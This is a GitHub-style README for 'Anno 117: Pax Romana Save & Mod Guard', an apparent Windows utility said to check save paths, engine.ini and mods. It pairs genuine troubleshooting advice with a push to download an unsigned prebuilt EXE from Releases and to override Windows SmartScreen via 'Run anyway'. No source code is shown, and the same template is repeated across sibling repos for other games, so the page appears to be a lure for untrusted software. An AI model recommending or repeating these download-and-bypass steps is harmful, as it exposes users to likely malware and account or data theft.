<p align="center">
  <img src="https://i.postimg.cc/2jgr7Vny/banner.png" alt="Anno 117: Pax Romana Save & Mod Guard — Save Backups, DX12 & Mod Checks" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Backup%20%26%20Diagnostics-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-anno117--save--guard--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Anno 117: Pax Romana Save & Mod Guard — Save Backups, DX12 & Mod Checks

**Anno 117: Pax Romana crashing to desktop on DirectX 12? Looking for your Roman province save files in Documents, or isolating outdated mods after a Ubisoft patch? Back up your accounts folder and check your paths first.**

Anno 117: Pax Romana Save & Mod Guard focuses on Ubisoft Mainz's local profile layout on Windows: **campaign and sandbox saves, `engine.ini`, and crash logs reside inside `Documents\Anno 117 - Pax Romana`**, while community XML/`.rda` mods live inside the game's `mods\` directory.

This project is aimed at **Anno 117: Pax Romana on Windows PC (Steam & Ubisoft Connect)**. It covers `Documents\Anno 117 - Pax Romana` vs. OneDrive redirection, `engine.ini` renderer checks, and `mods\` folder auditing—not editing saves or bypassing Ubisoft Connect.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Province save missing or not updating | OneDrive Documents sync lock or split `Documents` path | Compare `%USERPROFILE%\Documents` vs. `OneDrive\Documents\Anno 117 - Pax Romana\accounts` |
| Crash to desktop on launch with DX12 | Corrupted renderer flags in `config\engine.ini` or outdated GPU driver | Back up `engine.ini` and check `logs\` for D3D12 errors |
| Blank UI or crash after Ubisoft update | Outdated XML / `.rda` mod inside `Anno 117 - Pax Romana\mods\` | Isolate `mods\` subfolders and test a clean launch |
| Large late-game empire save at risk | Single active profile folder without dated offline snapshots | Create a timestamped backup of `accounts\<AccountID>` outside OneDrive |

## Download for Windows

[**Download Anno117SaveGuard.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Anno117SaveGuard.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Anno117SaveGuard.exe`? (Automatic checks in ~2 seconds)

- Detects whether Windows resolves `Anno 117 - Pax Romana` to local `Documents` or `OneDrive\Documents`.
- Scans `accounts\<AccountID>` for `.a8s` save files, prints byte sizes and timestamps, and flags `0 KB` writes.
- Inspects `config\engine.ini` and recent `logs\` entries for DirectX 12 initialization errors.
- Audits the game's `mods\` directory so you can isolate outdated packs after a Ubisoft patch.

### Sample Diagnostic Output

```text
[Anno117SaveGuard] Scanning Windows profile & Ubisoft paths...
[OK]   Active Documents : C:\Users\Player\Documents\Anno 117 - Pax Romana
[WARN] OneDrive mirror  : C:\Users\Player\OneDrive\Documents\Anno 117 - Pax Romana (older copy found)
[OK]   Save folder      : accounts\a8f3-91c2\Profile1 (6 save files, latest: 18.4 MB)
[OK]   Config file      : config\engine.ini (valid, 3.2 KB)
[INFO] Game mods folder : D:\SteamLibrary\steamapps\common\Anno 117 - Pax Romana\mods (2 mods active)
```

The release ZIP is named `Anno117SaveGuard.zip`; the Windows executable inside is named `Anno117SaveGuard.exe`.

1. Close Anno 117: Pax Romana before moving or checking game files.
2. Click **Download Anno117SaveGuard.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Anno117SaveGuard.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Anno 117: Pax Romana and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Steam or Ubisoft Connect installation of Anno 117: Pax Romana, and access to `Documents`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Anno117SaveGuard.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Save files missing or failing to write due to OneDrive sync locks

When OneDrive backs up `Documents`, cloud file locks on `Documents\Anno 117 - Pax Romana\accounts` can interrupt autosaves or split your local vs. OneDrive save directories.

### Crash to desktop on launch with DirectX 12 enabled

Corrupted flags in `Documents\Anno 117 - Pax Romana\config\engine.ini` or outdated GPU drivers can crash the renderer before reaching the main menu.

### UI or gameplay glitches after a patch with mods installed

Community mods inside `Anno 117 - Pax Romana\mods\` that patch `assets.xml` often need updates after official Ubisoft patches.

### Backing up large late-game empire saves before updates

Late-game multi-island saves grow large; keeping dated offline copies protects dozens of hours of city-building progress.

## Where Anno 117: Pax Romana files normally belong

On Windows PC, saves, configuration files, and logs live in your user Documents folder:

```text
%USERPROFILE%\Documents\Anno 117 - Pax Romana\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Documents\Anno 117 - Pax Romana\
├── accounts\
│   └── <AccountID>\
│       └── <ProfileName>\
├── config\
│   └── engine.ini
└── logs\
```

If OneDrive Folder Backup is active, check `%USERPROFILE%\OneDrive\Documents\Anno 117 - Pax Romana\`. Community mods live in your installation directory under `Anno 117 - Pax Romana\mods\`.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Anno 117: Pax Romana and Ubisoft Connect overlay.** Verify the game executable is closed in Task Manager before copying saves.
2. **Check whether `Documents` is local or redirected to OneDrive.** Compare `%USERPROFILE%\Documents` against `%USERPROFILE%\OneDrive\Documents`.
3. **Back up `Documents\Anno 117 - Pax Romana\accounts`.** Copy your profile save folder to a separate dated directory before updating or modding.
4. **Inspect `config\engine.ini` and `logs\`.** Back up `engine.ini` before testing DirectX renderer or resolution resets.
5. **Isolate `mods\` folders after official patches.** Temporarily move custom mod folders out of the installation `mods\` directory if menus break.
6. **Verify installed files in Steam or Ubisoft Connect.** Repair any corrupted `.rda` archive files.
7. **Restart the game cleanly and load a backup copy to verify.** Confirm your Roman provinces load before deleting temporary backups.

### Before moving any files

Always keep an untouched copy of `Documents\Anno 117 - Pax Romana\accounts` outside OneDrive before clearing configs or removing gameplay mods.

## What an effective diagnostic report should tell you

A clear diagnostic check locates **the active `Documents\Anno 117 - Pax Romana` folder (local vs. OneDrive)**, lists save timestamps in `accounts\`, inspects `engine.ini`, and audits `mods\`.

## FAQ

**Where are Anno 117: Pax Romana save files stored on Windows?**

Inside `%USERPROFILE%\Documents\Anno 117 - Pax Romana\accounts\<AccountID>\` (or under `OneDrive\Documents` if OneDrive backup is enabled).

**Where are Anno 117: Pax Romana mods installed?**

Place mod folders inside your installation directory at `Anno 117 - Pax Romana\mods\`.

**Why does Anno 117 crash on startup after changing graphics settings?**

Back up and reset `Documents\Anno 117 - Pax Romana\config\engine.ini` to restore default DirectX settings.

**Can OneDrive cause autosave failures in Anno 117?**

Yes—exclude `Anno 117 - Pax Romana` from OneDrive sync or pause syncing during long sessions if autosaves fail.

**Does this tool edit denarii, resources, or save files?**

No. It performs local folder, config, and save backup checks only.

**Are any game files or mods bundled with this repository?**

No copyrighted Ubisoft files or third-party mods are included here.

## Useful reading

- [Anno 117: Pax Romana Official Website (Ubisoft)](https://www.ubisoft.com/game/anno/117-pax-romana)
- [Anno 117: Pax Romana on Steam](https://store.steampowered.com/app/3274580/Anno_117_Pax_Romana/)

## More Windows Game Diagnostic Tools

- [Enshrouded-WorldMigrationGuard](../Enshrouded-WorldMigrationGuard) — Enshrouded 1.0 world & dedicated server save backups
- [ManorLords-SaveModInspector](../ManorLords-SaveModInspector) — Manor Lords UE5 save backups & `~mods` isolation
- [Subnautica2-CoopSaveSentinel](../Subnautica2-CoopSaveSentinel) — Subnautica 2 co-op save slot & `~mods` checks
- [FM27-SavePathCheck](../FM27-SavePathCheck) — Football Manager 27 Documents & OneDrive save path locator

*Independent community project. Not affiliated with Ubisoft Entertainment, Ubisoft Mainz, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
 
 
